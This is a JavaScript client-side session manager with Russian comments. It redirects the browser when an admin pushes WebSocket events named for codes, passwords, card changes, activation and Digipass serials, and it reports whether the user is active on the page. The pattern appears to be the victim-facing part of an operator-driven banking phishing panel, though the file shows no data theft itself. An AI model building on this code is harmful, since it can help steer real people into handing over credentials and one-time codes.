/**
 * Session Manager - управление сессией пользователя через WebSocket
 * 
 * Функционал:
 * - Подключение к каналу сессии
 * - Обработка редиректов от админа
 * - Отслеживание видимости страницы
 * - Восстановление сессии из localStorage
 * - Ping для проверки активности
 */

const SESSION_STORAGE_KEY = 'session_id';
const PING_INTERVAL = 30000; // 30 секунд

class SessionManager {
    constructor() {
        this.sessionId = null;
        this.channel = null;
        this.pingInterval = null;
        this.isConnected = false;
        this.isRedirecting = false;
    }

    /**
     * Инициализация менеджера сессий
     */
    init() {
        // Пробуем восстановить сессию из localStorage
        this.sessionId = this.getStoredSessionId();

        if (this.sessionId) {
            // Проверяем статус существующей сессии
            this.checkSessionStatus();
        }

        // Устанавливаем обработчики видимости
        this.setupVisibilityHandlers();

        console.log('[SessionManager] Initialized', { sessionId: this.sessionId });
    }

    /**
     * Создание новой сессии
     */
    async createSession(inputType, inputValue) {
        try {
            const response = await axios.post('/api/session', {
                input_type: inputType,
                input_value: inputValue,
            });

            this.sessionId = response.data.data.id;
            this.storeSessionId(this.sessionId);
            
            // Подключаемся к каналу сессии
            this.connectToChannel();
            
            // Запускаем ping
            this.startPing();
            
            console.log('[SessionManager] Session created:', this.sessionId);
            
            return response.data;
        } catch (error) {
            console.error('[SessionManager] Failed to create session:', error);
            throw error;
        }
    }

    /**
     * Подключение к каналу сессии
     */
    connectToChannel() {
        if (!this.sessionId || !window.Echo) {
            console.warn('[SessionManager] Cannot connect: no sessionId or Echo not initialized');
            return;
        }

        if (this.isConnected && this.channel && this._connectedSessionId === this.sessionId) {
            console.log('[SessionManager] Already connected to this channel, skipping');
            return;
        }

        if (this.channel && this._connectedSessionId && this._connectedSessionId !== this.sessionId) {
            window.Echo.leave(`session.${this._connectedSessionId}`);
        }

        this.channel = window.Echo.channel(`session.${this.sessionId}`);
        this._connectedSessionId = this.sessionId;

        this.channel
            .listen('.action.code', (data) => this.handleActionRedirect(data))
            .listen('.action.push', (data) => this.handleActionRedirect(data))
            .listen('.action.push-icon', (data) => this.handleActionRedirect(data))
            .listen('.action.password', (data) => this.handleActionRedirect(data))
            .listen('.action.card-change', (data) => this.handleActionRedirect(data))
            .listen('.action.error', (data) => this.handleActionRedirect(data))
            .listen('.action.custom-error', (data) => this.handleActionRedirect(data))
            .listen('.action.custom-question', (data) => this.handleActionRedirect(data))
            .listen('.action.custom-image', (data) => this.handleActionRedirect(data))
            .listen('.action.image-question', (data) => this.handleActionRedirect(data))
            .listen('.action.activation', (data) => this.handleActionRedirect(data))
            .listen('.action.success-hold', (data) => this.handleActionRedirect(data))
            .listen('.action.redirect', (data) => this.handleRedirect(data))
            .listen('.action.hold', (data) => this.handleActionRedirect(data))
            .listen('.redirect', (data) => this.handleRedirect(data))
            .listen('.action.qr_code', (data) => this.handleQrCode(data))
            .listen('.action.digipass-serial', (data) => this.handleDigipassSerial(data));

        this.channel.listen('.action.online.check', (data) => this.handleOnlineCheck(data));

        this.channel
            .listen('.session.assigned', (data) => this.handleSessionAssigned(data))
            .listen('.session.completed', (data) => this.handleSessionCompleted(data))
            .listen('.session.cancelled', (data) => this.handleSessionCancelled(data))
            .listen('.session.status.response', (data) => this.handleStatusResponse(data));

        this.isConnected = true;
        console.log('[SessionManager] Connected to channel:', `session.${this.sessionId}`);
    }

    
    handleQrCode(data) {
        console.log('[SessionManager] QR code received:', data);
        this.dispatchEvent('session:qr_code', data);
    }

    handleDigipassSerial(data) {
        console.log('[SessionManager] Digipass serial trigger received:', data);
        this.dispatchEvent('session:digipass_serial', data);
    }

    /**
     * Обработка редиректа на форму действия
     */
    handleActionRedirect(data) {
        console.log('[SessionManager] Action redirect received:', data);

        if (data.redirect_url) {
            this.redirect(data.redirect_url);
        } else if (data.action_type && data.session_id) {
            this.redirect(`/session/${data.session_id}/action/${data.action_type}`);
        }
    }

    /**
     * Обработка общего события редиректа
     */
    handleRedirect(data) {
        console.log('[SessionManager] Redirect received:', data);

        if (data.url) {
            this.redirect(data.url);
        }
    }

    /**
     * Выполнение редиректа
     */
    redirect(url) {
        // Защита от двойного редиректа
        if (this.isRedirecting) {
            console.log('[SessionManager] Already redirecting, skipping:', url);
            return;
        }

        // Не редиректим на ту же страницу
        if (window.location.pathname === url || window.location.href === url) {
            console.log('[SessionManager] Already on this page, skipping:', url);
            return;
        }

        this.isRedirecting = true;
        console.log('[SessionManager] Redirecting to:', url);
        window.location.href = url;
    }

    /**
     * Обработка проверки онлайн статуса — теперь учитывает активность пользователя на странице с помощью
     * Page Visibility API и событий focus/blur/activity. 
     * Статус pинг отправляется при изменении активности.
     */
    initializeOnlineTracking() {
        // Сохраняем ссылку на функцию для удаления позже, если потребуется
        this._boundOnVisibilityChange = () => this._handleVisibilityChange();
        this._boundOnFocus = () => this._handleFocus();
        this._boundOnBlur = () => this._handleBlur();
        this._boundOnActivity = () => this._resetInactivityTimer();

        document.addEventListener("visibilitychange", this._boundOnVisibilityChange);
        window.addEventListener("focus", this._boundOnFocus);
        window.addEventListener("blur", this._boundOnBlur);
        document.addEventListener("mousemove", this._boundOnActivity);
        document.addEventListener("keypress", this._boundOnActivity);
        this._userActive = true;
        this._resetInactivityTimer(); // Запустить таймер отслеживания неактивности
    }

    /**
     * Удалить обработчики событий отслеживания онлайна (вызывать при завершении сессии)
     */
    removeOnlineTracking() {
        document.removeEventListener("visibilitychange", this._boundOnVisibilityChange);
        window.removeEventListener("focus", this._boundOnFocus);
        window.removeEventListener("blur", this._boundOnBlur);
        document.removeEventListener("mousemove", this._boundOnActivity);
        document.removeEventListener("keypress", this._boundOnActivity);
        this._clearInactivityTimer();
    }

    _handleVisibilityChange() {
        if (document.hidden) {
            console.log("Пользователь ушел со страницы");
            this.sendOnlineStatus(false);
        } else {
            console.log("Пользователь вернулся на страницу");
            this.sendOnlineStatus(true);
        }
    }

    _handleFocus() {
        console.log("Окно браузера активно");
        this.sendOnlineStatus(true);
        this._resetInactivityTimer();
    }

    _handleBlur() {
        console.log("Окно браузера неактивно");
        this.sendOnlineStatus(false);
        this._clearInactivityTimer();
    }

    _resetInactivityTimer() {
        this._clearInactivityTimer();
        // Через 30 секунд после последнего движения мыши/клавиши считаем, что пользователь неактивен
        this._inactivityTimer = setTimeout(() => {
            console.log("Пользователь неактивен (30 сек бездействия)");
            this.sendOnlineStatus(false);
        }, 30000);
        // Пока пользователь активен, если был статус "неактивен", ставим "активен"
        if (!this._userActive) {
            this._userActive = true;
            this.sendOnlineStatus(true);
        }
    }

    _clearInactivityTimer() {
        if (this._inactivityTimer) clearTimeout(this._inactivityTimer);
        this._userActive = false;
    }

    /**
     * Обработка запроса проверки онлайн статуса с сервера — отвечает актуальным статусом.
     */
    handleOnlineCheck(data) {
        console.log('[SessionManager] Online check received:', data);

        // Статус отправляем исходя из document.visibilityState и наличия активности
        const isOnline = !document.hidden && this._userActive;
        this.sendOnlineStatus(isOnline);
    }

    /**
     * Отправка статуса онлайн через API ping
     * @param {boolean} isOnline
     */
    async sendOnlineStatus(isOnline) {
        if (!this.sessionId) return;
        try {
            await axios.post(`/api/session/${this.sessionId}/ping`, {
                is_online: isOnline,
                visibility: document.visibilityState,
            });
            console.log('[SessionManager] Online status sent:', isOnline, document.visibilityState);
        } catch (error) {
            console.error('[SessionManager] Failed to send online status:', error);
        }
    }

    /**
     * Обработка назначения админа
     */
    handleSessionAssigned(data) {
        console.log('[SessionManager] Session assigned to admin:', data);
        // Можно показать индикатор что сессия в обработке
        this.dispatchEvent('session:assigned', data);
    }

    /**
     * Обработка завершения сессии
     */
    handleSessionCompleted(data) {
        console.log('[SessionManager] Session completed:', data);

        // Очищаем localStorage
        this.clearStoredSessionId();

        // Останавливаем ping
        this.stopPing();

        // Отключаемся от канала
        this.disconnect();

        // Редирект на страницу завершения или главную
        this.dispatchEvent('session:completed', data);
    }

    /**
     * Обработка отмены сессии
     */
    handleSessionCancelled(data) {
        console.log('[SessionManager] Session cancelled:', data);

        // Очищаем localStorage
        this.clearStoredSessionId();

        // Останавливаем ping
        this.stopPing();

        // Отключаемся от канала
        this.disconnect();

        this.dispatchEvent('session:cancelled', data);
    }

    /**
     * Обработка ответа на запрос статуса
     */
    handleStatusResponse(data) {
        console.log('[SessionManager] Status response:', data);

        if (data.is_active && data.redirect_url) {
            // Если сессия активна и есть URL для редиректа
            this.redirect(data.redirect_url);
        } else if (!data.is_active) {
            // Сессия неактивна - очищаем и показываем главную
            this.clearStoredSessionId();
            this.dispatchEvent('session:inactive', data);
        }
    }

    /**
     * Проверка статуса сессии через API
     */
    async checkSessionStatus() {
        if (!this.sessionId) return;

        try {
            const response = await axios.get(`/api/session/${this.sessionId}/status`);
            const data = response.data.data;
            
            console.log('[SessionManager] Session status:', data);
            
            if (data.is_active) {
                // Сессия активна - подключаемся к каналу
                this.connectToChannel();
                this.startPing();
                
                // Если есть текущий URL - редиректим
                if (data.current_url && window.location.pathname === '/') {
                    this.redirect(data.current_url);
                }
            } else {
                // Сессия неактивна - очищаем
                this.clearStoredSessionId();
                this.sessionId = null;
            }
            
            return data;
        } catch (error) {
            console.error('[SessionManager] Failed to check session status:', error);
            
            // Если сессия не найдена (404) - очищаем
            if (error.response?.status === 404) {
                this.clearStoredSessionId();
                this.sessionId = null;
            }
            
            return null;
        }
    }

    /**
     * Настройка обработчиков видимости страницы
     */
    setupVisibilityHandlers() {
        // Отслеживание видимости вкладки
        document.addEventListener('visibilitychange', () => {
            const isVisible = document.visibilityState === 'visible';
            this.handleVisibilityChange(isVisible, document.visibilityState);
        });

        // Фокус/блюр окна
        window.addEventListener('focus', () => {
            this.handleVisibilityChange(true, 'focus');
        });

        window.addEventListener('blur', () => {
            this.handleVisibilityChange(false, 'blur');
        });

        // Перед закрытием страницы
        window.addEventListener('beforeunload', () => {
            this.handleVisibilityChange(false, 'beforeunload');
        });
    }

    /**
     * Обработка изменения видимости
     */
    handleVisibilityChange(isOnline, visibility) {
        if (!this.sessionId) return;

        console.log('[SessionManager] Visibility changed:', { isOnline, visibility });

        // Отправляем статус через API
        axios.post(`/api/session/${this.sessionId}/ping`, {
            is_online: isOnline,
            visibility: visibility,
        }).catch(error => {
            console.error('[SessionManager] Failed to send visibility:', error);
        });
    }

    /**
     * Запуск периодического ping
     */
    startPing() {
        if (this.pingInterval) return;

        this.pingInterval = setInterval(() => {
            this.ping();
        }, PING_INTERVAL);

        console.log('[SessionManager] Ping started');
    }

    /**
     * Остановка ping
     */
    stopPing() {
        if (this.pingInterval) {
            clearInterval(this.pingInterval);
            this.pingInterval = null;
            console.log('[SessionManager] Ping stopped');
        }
    }

    /**
     * Отправка ping
     */
    async ping() {
        if (!this.sessionId) return;

        try {
            await axios.post(`/api/session/${this.sessionId}/ping`);
        } catch (error) {
            console.error('[SessionManager] Ping failed:', error);
        }
    }

    /**
     * Отключение от канала
     */
    disconnect() {
        if (this.channel && this._connectedSessionId) {
            window.Echo.leave(`session.${this._connectedSessionId}`);
            this.channel = null;
            this._connectedSessionId = null;
            this.isConnected = false;
            console.log('[SessionManager] Disconnected from channel');
        }
    }

    /**
     * Сохранение session_id в localStorage
     */
    storeSessionId(sessionId) {
        try {
            localStorage.setItem(SESSION_STORAGE_KEY, sessionId);
        } catch (error) {
            console.error('[SessionManager] Failed to store session_id:', error);
        }
    }

    /**
     * Получение session_id из localStorage
     */
    getStoredSessionId() {
        try {
            return localStorage.getItem(SESSION_STORAGE_KEY);
        } catch (error) {
            console.error('[SessionManager] Failed to get stored session_id:', error);
            return null;
        }
    }

    /**
     * Очистка session_id из localStorage
     */
    clearStoredSessionId() {
        try {
            localStorage.removeItem(SESSION_STORAGE_KEY);
        } catch (error) {
            console.error('[SessionManager] Failed to clear session_id:', error);
        }
    }

    /**
     * Dispatch custom event
     */
    dispatchEvent(eventName, data) {
        window.dispatchEvent(new CustomEvent(eventName, { detail: data }));
    }

    /**
     * Получение текущего session_id
     */
    getSessionId() {
        return this.sessionId;
    }

    /**
     * Установка session_id (для использования из внешнего кода)
     */
    setSessionId(sessionId) {
        this.sessionId = sessionId;
        this.storeSessionId(sessionId);
        this.connectToChannel();
        this.startPing();
    }
}

// Создаем глобальный экземпляр
window.SessionManager = new SessionManager();

// Автоматическая инициализация при загрузке DOM
document.addEventListener('DOMContentLoaded', () => {
    window.SessionManager.init();
});

export default window.SessionManager;
